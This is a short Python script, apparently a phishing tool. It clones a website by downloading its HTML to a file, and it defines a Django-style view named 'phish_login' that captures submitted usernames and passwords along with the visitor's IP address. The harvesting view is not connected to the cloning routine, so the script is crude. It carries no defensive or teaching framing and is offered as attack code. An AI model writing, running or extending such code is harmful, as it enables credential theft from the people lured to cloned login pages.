import requests, argparse, sys

def get_phish_web(url):
    try:
        response = requests.get(url)
        response.raise_for_status()
        return response.text
    except requests.exceptions.HTTPError as errh:
        return f"HTTP Error: {errh}"
    except requests.exceptions.ConnectionError as errc:
        return f"Error Connecting: {errc}"
    except requests.exceptions.Timeout as errt:
        return f"Timeout Error: {errt}"
    except requests.exceptions.RequestException as err:
        return f"Something went wrong: {err}"

def get_ip_address(request):
    x_forwarded_for = request.META.get('HTTP_X_FORWARDED_FOR')
    if x_forwarded_for:
        ip = x_forwarded_for.split(',')[0]
    else:
        ip = request.META.get('REMOTE_ADDR')
    return ip

def phish_login(request):
    if request.method == 'POST':
        username = request.POST.get('username')
        password = request.POST.get('password')
        ip_address = get_ip_address(request)
        return f"Username: {username}, Password: {password}, IP Address: {ip_address}"
    else:
        return "Invalid request method."
parser = argparse.ArgumentParser()
parser.add_argument("-s", type=str, help="")
parser.add_argument("-n", type=str, help="")
args = parser.parse_args()
def main():
    if args.s:
        if args.n:
            url = str(args.s)
            filename = str(args.n)
            phish_web = get_phish_web(url)
            phish_web2 = str(phish_web)
            with open(filename,"+w") as f:
                f.write(phish_web2)
    else:
        sys.exit()

if __name__ == "__main__":
    main()